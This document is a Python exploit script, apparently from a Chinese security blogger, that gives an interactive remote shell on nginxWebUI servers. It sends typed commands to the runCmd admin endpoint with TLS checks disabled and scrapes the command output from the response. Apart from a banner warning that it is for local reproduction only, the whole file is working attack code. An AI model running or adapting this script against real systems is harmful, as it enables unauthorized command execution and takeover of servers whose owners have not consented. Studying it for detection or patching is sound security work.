# -*- encoding: utf-8 -*-
# Time: 2023/06/30 11:23:08
# Author: crow 


import requests
from urllib3.exceptions import InsecureRequestWarning
import sys
import re 

def title():
    print('+-----------------------------------------------')
    print('[+]  \033[34mGithub : https://github.com/crow821/                                \033[0m')
    print('[+]  \033[34m公众号 : 乌鸦安全(crowsec)                                           \033[0m')
    print('[+]  \033[34m功  能:  nginxWebUI 命令执行漏洞单个检测          \033[0m')
    print('[+]  \033[36m使用格式:  python3 nginxWebUI_exp.py                          \033[0m')
    print('[+]  \033[31m警告: 漏洞仅限本地复现使用,请遵守网络安全法律法规,违者使用与本程序开发者无关    \033[0m')
    print('[+]  \033[31m警告: 漏洞仅限本地复现使用,请遵守网络安全法律法规,违者使用与本程序开发者无关    \033[0m')
    print('[+]  \033[31m警告: 漏洞仅限本地复现使用,请遵守网络安全法律法规,违者使用与本程序开发者无关    \033[0m')

    print('+-------------------------------------------------')




title()

# 忽略SSL证书问题
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def process_url(url, command):
    if 'https://' in url:
        # https://xxx+/AdminPage/conf/runCmd?cmd=命令%26%26echo%20nginx
        endpoint = f"{url}/AdminPage/conf/runCmd?cmd={command}%26%26echo%20nginx"

    elif 'http' in url:
        endpoint =  f"{url}/AdminPage/conf/runCmd?cmd={command}%26%26echo%20nginx"

    else:
        # url+/AdminPage/conf/runCmd?cmd=命令%26%26echo%20nginx
        endpoint = 'http://' + f"{url}/AdminPage/conf/runCmd?cmd={command}%26%26echo%20nginx"
    
    response = requests.get(endpoint, verify=False)
    return response.text

# 输入URL和命令
url = input("请输入URL: ")



# # 处理URL并进行GET请求
# result = process_url(url, command)
# print(result)

while True:
    try:
        command = input("请输入命令，q代表结束: ")
        if command == 'q':
            sys.exit()
        else:
            result = process_url(url, command)
            # print(result)
            # res = re.findall('<br>(.*?)<br>nginx<br>"}', result)
            res = re.findall('<br>运行失败<br>(.*?)<br>nginx<br>"}', result)

            if res != '':
                print(res[0])
            else:
                print('执行失败')

    except Exception as e:
        pass